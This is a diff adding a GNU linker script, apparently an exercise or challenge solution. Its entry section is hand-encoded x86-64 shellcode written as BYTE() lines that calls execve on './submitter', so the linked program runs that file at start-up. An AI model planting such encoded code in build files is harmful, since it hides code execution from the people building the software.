@@ -1,0 +1,87 @@
+ENTRY(MY_ENTRY);
+SECTIONS
+{
+    . = 0x400000;
+    .entry : {
+        MY_ENTRY = .;
+        BYTE(0x68);
+BYTE(0x75);
+BYTE(0x64);
+BYTE(0x73);
+BYTE(0x1);
+BYTE(0x81);
+BYTE(0x34);
+BYTE(0x24);
+BYTE(0x1);
+BYTE(0x1);
+BYTE(0x1);
+BYTE(0x1);
+BYTE(0x48);
+BYTE(0xb8);
+BYTE(0x2e);
+BYTE(0x2f);
+BYTE(0x73);
+BYTE(0x75);
+BYTE(0x62);
+BYTE(0x6d);
+BYTE(0x69);
+BYTE(0x74);
+BYTE(0x50);
+BYTE(0x48);
+BYTE(0x89);
+BYTE(0xe7);
+BYTE(0x6a);
+BYTE(0x72);
+BYTE(0x48);
+BYTE(0xb8);
+BYTE(0x73);
+BYTE(0x75);
+BYTE(0x62);
+BYTE(0x6d);
+BYTE(0x69);
+BYTE(0x74);
+BYTE(0x74);
+BYTE(0x65);
+BYTE(0x50);
+BYTE(0x48);
+BYTE(0x89);
+BYTE(0xe6);
+BYTE(0x48);
+BYTE(0x31);
+BYTE(0xd2);
+BYTE(0x52);
+BYTE(0x56);
+BYTE(0x48);
+BYTE(0x89);
+BYTE(0xe6);
+BYTE(0x48);
+BYTE(0x31);
+BYTE(0xd2);
+BYTE(0x6a);
+BYTE(0x3b);
+BYTE(0x58);
+BYTE(0xf);
+BYTE(0x5);
+    }
+    .text : {
+        *(.text.prologue);
+        *(.text*);
+    }
+    .data : {
+        *(.data*);
+    }
+    .rodata : {
+        *(.rodata*);
+    }
+    .bss : {
+        __bss_start = .;
+        *(COMMON);
+        *(.bss);
+        . = ALIGN(4);
+        __bss_end = .;
+    }
+    /DISCARD/ : {
+        *(.note.gnu.build-id);
+    }
+}
+
